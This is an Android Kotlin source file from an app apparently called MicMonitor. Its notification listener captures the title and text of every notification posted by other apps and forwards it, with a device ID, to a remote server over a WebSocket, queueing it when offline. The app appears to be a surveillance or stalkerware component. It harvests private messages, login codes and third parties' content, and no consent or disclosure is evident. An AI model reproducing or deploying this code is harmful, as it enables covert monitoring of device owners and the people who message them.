package com.micmonitor.app

import android.app.Notification
import android.content.pm.PackageManager
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import org.json.JSONObject

/**
 * NotifListenerService — captures every incoming notification and forwards
 * it to the server via MicService's active WebSocket connection.
 *
 * Requires the user to grant Notification Access in:
 *   Settings → Notifications → Notification Access → Device Services
 */
class NotifListenerService : NotificationListenerService() {

    companion object {
        const val TAG = "NotifListener"
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val pkg = sbn.packageName ?: return

            // Skip our own service notification
            if (pkg == applicationContext.packageName) return

            val extras: Bundle = sbn.notification.extras
            val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
            val text  = (extras.getCharSequence(Notification.EXTRA_TEXT) ?: "").toString()

            // Skip empty / silent notifications
            if (title.isEmpty() && text.isEmpty()) return

            // Resolve human-readable app name
            val appName = try {
                packageManager.getApplicationLabel(
                    packageManager.getApplicationInfo(pkg, 0)
                ).toString()
            } catch (_: PackageManager.NameNotFoundException) { pkg }

            val prefs   = getSharedPreferences("micmonitor", MODE_PRIVATE)
            val deviceId = prefs.getString("device_id", "unknown") ?: "unknown"

            val payload = JSONObject().apply {
                put("type",     "notification")
                put("deviceId", deviceId)
                put("app",      appName)
                put("pkg",      pkg)
                put("title",    title)
                put("text",     text)
                put("time",     sbn.postTime)
            }

            val ws = MicService.activeWebSocket
            if (ws != null) {
                ws.send(payload.toString())
                Log.d(TAG, "Sent notification from $appName: $title")
            } else {
                Log.w(TAG, "WebSocket not ready — queuing notification ($appName)")
                MicService.sendOrQueueNotification(payload.toString())
            }
        } catch (e: Exception) {
            Log.e(TAG, "onNotificationPosted error: ${e.message}")
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // No-op
    }
}
